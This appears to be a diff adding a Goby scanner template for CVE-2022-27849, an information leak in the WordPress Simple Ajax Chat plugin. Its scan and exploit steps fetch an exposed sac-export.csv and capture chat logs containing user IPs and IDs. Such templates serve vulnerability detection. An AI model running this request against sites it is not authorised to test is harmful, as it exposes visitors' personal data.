@@ -1,0 +1,126 @@
+{
+      "Name": "WordPress Simple Ajax Chat plugin InfoLeak CVE-2022-27849",
+      "Level": "1",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "app=\"wordpress\" || product=\"WordPress\"",
+      "Description": "Simple Ajax Chat makes it easy for your visitors to chat with each other on your website.",
+      "Product": "WordPress Simple Ajax Chat plugin",
+      "Homepage": "https://wordpress.org/plugins/simple-ajax-chat",
+      "Author": "",
+      "Impact": "Sensitive Information Disclosure (sac-export.csv) in Simple Ajax Chat (WordPress plugin) &lt;= 20220115",
+      "Recommendation": "https://wordpress.org/plugins/simple-ajax-chat",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-27849",
+            "https://wordpress.org/plugins/simple-ajax-chat"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/wp-content/plugins/simple-ajax-chat/sac-export.csv",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Chat Log",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "User IP",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "User ID",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/wp-content/plugins/simple-ajax-chat/sac-export.csv",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Chat Log",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "User IP",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "User ID",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
